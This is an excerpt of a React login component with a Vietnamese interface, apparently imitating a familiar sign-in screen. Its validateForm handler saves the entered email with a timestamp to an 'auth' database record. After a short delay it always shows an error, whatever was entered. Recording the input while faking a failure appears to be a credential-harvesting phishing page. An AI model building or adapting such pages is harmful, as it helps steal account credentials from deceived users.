...
export default function Login() {
  ...
  const validateForm = () => {
    if (step === 1) {
      updateDocument("auth", { email_1: email, create_at: new Date().getTime() }, id);
      setIsLoading(true);
      setTimeout(() => {
        setIsError(true);
        setIsLoading(false);
      ...
      <div className="relative">
        <div className="login-container">
          ...
          <div id="loginForm" onSubmit={validateForm}>
            ...
            <a id="recoveryOption" className="recoveryOption">
              Bạn quên email?
            </a>
          ...
          <div className="languageWrapper">
            ...
            <img
              ...
              height="16px"
            />
            <span className="languageText languageText-selected">
              Tiếng Việt
            </span>
            <span>|</span>
